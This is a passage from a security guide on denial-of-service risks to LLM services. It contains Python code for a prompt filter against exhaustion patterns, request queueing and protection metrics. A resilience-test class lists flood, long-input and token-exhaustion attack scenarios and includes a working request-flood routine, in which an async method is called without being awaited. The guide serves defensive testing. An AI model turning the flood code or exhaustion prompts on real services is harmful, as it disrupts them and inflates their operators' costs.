        for category, patterns in self.malicious_patterns.items():
            for pattern in patterns:
                matches = re.finditer(pattern, prompt, re.IGNORECASE)
                for match in matches:
                    detected_patterns.append({
                        'category': category,
                        'pattern': pattern,
                        'match': match.group(),
                        'position': match.span()
                    })
        
        # Check for suspicious numerical values
        large_numbers = re.findall(r'\b(\d{6,})\b', prompt)
        if large_numbers:
            detected_patterns.append({
                'category': 'large_numbers',
                'numbers': large_numbers,
                'risk': 'high' if any(int(n) > 1000000 for n in large_numbers) else 'medium'
            })
        
        # Determine action
        if detected_patterns:
            high_risk_patterns = [p for p in detected_patterns if p.get('risk') == 'high']
            
            if high_risk_patterns or len(detected_patterns) > 3:
                return {
                    'action': 'reject',
                    'reason': 'Potential DoS attack patterns detected',
                    'detected_patterns': detected_patterns
                }
            else:
                return {
                    'action': 'sanitize',
                    'sanitized_prompt': self.sanitize_prompt(prompt, detected_patterns),
                    'detected_patterns': detected_patterns
                }
        
        return {'action': 'allow'}
    
    def sanitize_prompt(self, prompt, detected_patterns):
        """Sanitize prompt by removing or modifying dangerous patterns"""
        
        sanitized = prompt
        
        for pattern_info in detected_patterns:
            if pattern_info['category'] == 'resource_exhaustion':
                # Replace large numbers with smaller ones
                sanitized = re.sub(r'\b\d{4,}\b', '100', sanitized)
            
            elif pattern_info['category'] == 'infinite_loops':
                # Remove infinite loop instructions
                sanitized = re.sub(r'(repeat|continue).*(forever|never|infinite)', 
                                 'repeat a few times', sanitized, flags=re.IGNORECASE)
            
            elif pattern_info['category'] == 'memory_exhaustion':
                # Limit large generation requests
                sanitized = re.sub(r'generate\s+\d+', 'generate 10', sanitized, flags=re.IGNORECASE)
        
        return sanitized
```

### Queue Management and Load Balancing

**1. Intelligent Queue Management**
```python
class IntelligentQueueManager:
    def __init__(self):
        self.queues = {
            'high_priority': PriorityQueue(),
            'normal': Queue(),
            'low_priority': Queue(),
            'batch': Queue()
        }
        
        self.queue_limits = {
            'high_priority': 50,
            'normal': 200,
            'low_priority': 100,
            'batch': 500
        }
        
        self.processing_weights = {
            'high_priority': 0.4,
            'normal': 0.4,
            'low_priority': 0.15,
            'batch': 0.05
        }
    
    def enqueue_request(self, request_data, user_priority='normal'):
        """Intelligently enqueue request based on priority and characteristics"""
        
        # Analyze request to determine appropriate queue
        queue_assignment = self.analyze_queue_assignment(request_data, user_priority)
        
        target_queue = queue_assignment['queue']
        
        # Check queue capacity
        if self.queues[target_queue].qsize() >= self.queue_limits[target_queue]:
            return {
                'success': False,
                'reason': f'{target_queue} queue is full',
                'queue_size': self.queues[target_queue].qsize(),
                'estimated_wait': self.estimate_wait_time(target_queue)
            }
        
        # Add request to queue with metadata
        queue_item = {
            'request_data': request_data,
            'enqueue_time': time.time(),
            'priority_score': queue_assignment['priority_score'],
            'estimated_processing_time': queue_assignment['estimated_time']
        }
        
        if target_queue == 'high_priority':
            self.queues[target_queue].put((queue_assignment['priority_score'], queue_item))
        else:
            self.queues[target_queue].put(queue_item)
        
        return {
            'success': True,
            'queue': target_queue,
            'position': self.queues[target_queue].qsize(),
            'estimated_wait': self.estimate_wait_time(target_queue)
        }
    
    def analyze_queue_assignment(self, request_data, user_priority):
        """Analyze request to determine optimal queue assignment"""
        
        # Calculate complexity score
        complexity_analyzer = RequestComplexityAnalyzer()
        complexity_result = complexity_analyzer.analyze_request_complexity(request_data)
        
        complexity_score = complexity_result['complexity_score']
        estimated_time = complexity_result['estimated_processing_time']
        
        # Determine queue based on complexity and user priority
        if user_priority == 'premium' and complexity_score < 30:
            return {
                'queue': 'high_priority',
                'priority_score': 100 - complexity_score,
                'estimated_time': estimated_time
            }
        elif complexity_score > 80 or estimated_time > 30:
            return {
                'queue': 'batch',
                'priority_score': 0,
                'estimated_time': estimated_time
            }
        elif complexity_score > 50:
            return {
                'queue': 'low_priority',
                'priority_score': 0,
                'estimated_time': estimated_time
            }
        else:
            return {
                'queue': 'normal',
                'priority_score': 0,
                'estimated_time': estimated_time
            }
    
    def get_next_request(self):
        """Get next request to process using weighted round-robin"""
        
        # Calculate current queue weights based on sizes and processing weights
        current_weights = {}
        total_requests = sum(q.qsize() for q in self.queues.values())
        
        if total_requests == 0:
            return None
        
        for queue_name, queue in self.queues.items():
            if queue.qsize() > 0:
                # Weight based on processing weight and queue fullness
                base_weight = self.processing_weights[queue_name]
                fullness_factor = queue.qsize() / self.queue_limits[queue_name]
                current_weights[queue_name] = base_weight * (1 + fullness_factor)
        
        # Select queue based on weights
        selected_queue = self.weighted_random_selection(current_weights)
        
        if selected_queue and not self.queues[selected_queue].empty():
            if selected_queue == 'high_priority':
                _, request_item = self.queues[selected_queue].get()
            else:
                request_item = self.queues[selected_queue].get()
            
            return request_item
        
        return None
    
    def weighted_random_selection(self, weights):
        """Select queue using weighted random selection"""
        
        if not weights:
            return None
        
        total_weight = sum(weights.values())
        random_value = random.uniform(0, total_weight)
        
        cumulative_weight = 0
        for queue_name, weight in weights.items():
            cumulative_weight += weight
            if random_value <= cumulative_weight:
                return queue_name
        
        return list(weights.keys())[-1]  # Fallback
```

## 🔧 Testing and Validation

### DoS Resilience Testing
```python
class DoSResilienceTest:
    def __init__(self, target_endpoint):
        self.target = target_endpoint
        self.test_scenarios = self.load_test_scenarios()
    
    def run_comprehensive_dos_test(self):
        """Run comprehensive DoS resilience testing"""
        
        results = {
            'test_scenarios': [],
            'overall_resilience_score': 0,
            'vulnerabilities_found': [],
            'recommendations': []
        }
        
        for scenario in self.test_scenarios:
            scenario_result = self.run_test_scenario(scenario)
            results['test_scenarios'].append(scenario_result)
            
            if scenario_result['vulnerability_detected']:
                results['vulnerabilities_found'].append(scenario_result)
        
        # Calculate overall resilience score
        results['overall_resilience_score'] = self.calculate_resilience_score(results['test_scenarios'])
        
        # Generate recommendations
        results['recommendations'] = self.generate_recommendations(results['vulnerabilities_found'])
        
        return results
    
    def load_test_scenarios(self):
        """Load DoS test scenarios"""
        
        return [
            {
                'name': 'High Frequency Request Flood',
                'type': 'volume_attack',
                'description': 'Send high volume of requests in short time',
                'parameters': {
                    'requests_per_second': 100,
                    'duration': 60,
                    'concurrent_connections': 50
                }
            },
            {
                'name': 'Long Input Attack',
                'type': 'resource_exhaustion',
                'description': 'Send extremely long inputs to exhaust memory',
                'parameters': {
                    'input_length': 100000,
                    'request_count': 10,
                    'concurrent': True
                }
            },
            {
                'name': 'Complex Query Attack',
                'type': 'computational_exhaustion',
                'description': 'Send computationally expensive queries',
                'parameters': {
                    'complexity_level': 'high',
                    'request_count': 20,
                    'timeout': 300
                }
            },
            {
                'name': 'Token Exhaustion Attack',
                'type': 'economic_dos',
                'description': 'Request maximum tokens to increase costs',
                'parameters': {
                    'max_tokens': 4000,
                    'request_count': 100,
                    'concurrent': True
                }
            }
        ]
    
    def run_test_scenario(self, scenario):
        """Run individual test scenario"""
        
        print(f"Running test: {scenario['name']}")
        
        start_time = time.time()
        
        try:
            if scenario['type'] == 'volume_attack':
                result = self.run_volume_attack(scenario['parameters'])
            elif scenario['type'] == 'resource_exhaustion':
                result = self.run_resource_exhaustion_attack(scenario['parameters'])
            elif scenario['type'] == 'computational_exhaustion':
                result = self.run_computational_attack(scenario['parameters'])
            elif scenario['type'] == 'economic_dos':
                result = self.run_economic_attack(scenario['parameters'])
            else:
                result = {'success': False, 'error': 'Unknown test type'}
            
            end_time = time.time()
            
            return {
                'scenario': scenario,
                'result': result,
                'duration': end_time - start_time,
                'vulnerability_detected': result.get('vulnerability_detected', False),
                'impact_level': result.get('impact_level', 'none')
            }
            
        except Exception as e:
            return {
                'scenario': scenario,
                'error': str(e),
                'vulnerability_detected': True,
                'impact_level': 'critical'
            }
    
    async def run_volume_attack(self, parameters):
        """Run high-volume request attack"""
        
        requests_per_second = parameters['requests_per_second']
        duration = parameters['duration']
        concurrent_connections = parameters['concurrent_connections']
        
        successful_requests = 0
        failed_requests = 0
        response_times = []
        
        async with aiohttp.ClientSession() as session:
            start_time = time.time()
            
            while time.time() - start_time < duration:
                # Create batch of concurrent requests
                tasks = []
                for _ in range(concurrent_connections):
                    task = self.send_test_request(session, "Simple test request")
                    tasks.append(task)
                
                # Execute batch
                batch_start = time.time()
                results = await asyncio.gather(*tasks, return_exceptions=True)
                batch_end = time.time()
                
                # Analyze results
                for result in results:
                    if isinstance(result, Exception):
                        failed_requests += 1
                    else:
                        successful_requests += 1
                        response_times.append(batch_end - batch_start)
                
                # Control request rate
                elapsed = time.time() - start_time
                expected_requests = elapsed * requests_per_second
                actual_requests = successful_requests + failed_requests
                
                if actual_requests < expected_requests:
                    await asyncio.sleep(0.1)
        
        # Analyze results
        total_requests = successful_requests + failed_requests
        success_rate = successful_requests / total_requests if total_requests > 0 else 0
        avg_response_time = np.mean(response_times) if response_times else 0
        
        # Determine if vulnerability exists
        vulnerability_detected = (
            success_rate < 0.5 or  # High failure rate indicates overload
            avg_response_time > 10 or  # Very slow responses
            failed_requests > total_requests * 0.8  # Too many failures
        )
        
        return {
            'successful_requests': successful_requests,
            'failed_requests': failed_requests,
            'success_rate': success_rate,
            'avg_response_time': avg_response_time,
            'vulnerability_detected': vulnerability_detected,
            'impact_level': 'high' if vulnerability_detected else 'low'
        }
```

## 📊 Security Metrics

### DoS Protection Effectiveness
```python
class DoSProtectionMetrics:
    def __init__(self):
        self.metrics = {
            'requests_processed': 0,
            'requests_blocked': 0,
            'requests_throttled': 0,
            'false_positives': 0,
            'attack_attempts_detected': 0,
            'successful_attacks': 0
        }
    
    def calculate_protection_effectiveness(self):
        """Calculate overall DoS protection effectiveness"""
        
        total_requests = self.metrics['requests_processed'] + self.metrics['requests_blocked']
        
        if total_requests == 0:
            return 100.0
        
        # Calculate key ratios
        block_rate = self.metrics['requests_blocked'] / total_requests
        false_positive_rate = self.metrics['false_positives'] / total_requests
        
        if self.metrics['attack_attempts_detected'] > 0:
            attack_success_rate = self.metrics['successful_attacks'] / self.metrics['attack_attempts_detected']
        else:
            attack_success_rate = 0
        
        # Calculate effectiveness score
        # Higher block rate is good, but high false positive rate is bad
        # Low attack success rate is good
        effectiveness_score = (
            (block_rate * 40) +  # Reward blocking malicious requests
            ((1 - false_positive_rate) * 30) +  # Penalize false positives
            ((1 - attack_success_rate) * 30)  # Reward preventing attacks
        )
        
        return min(100.0, max(0.0, effectiveness_score))
```

## 📚 Additional Resources

### Research Papers
- "Denial of Service Attacks on Machine Learning Systems" (2020)
- "Resource Exhaustion Attacks on Deep Learning Services" (2021)
- "Economic Denial of Service in Cloud AI Services" (2022)

### Monitoring Tools
- **Prometheus + Grafana:** Resource monitoring and alerting
- **ELK Stack:** Log analysis and pattern detection
- **New Relic:** Application performance monitoring

---

**Next:** [LLM05: Supply Chain Vulnerabilities](../LLM05-supply-chain-vulnerabilities/README.md)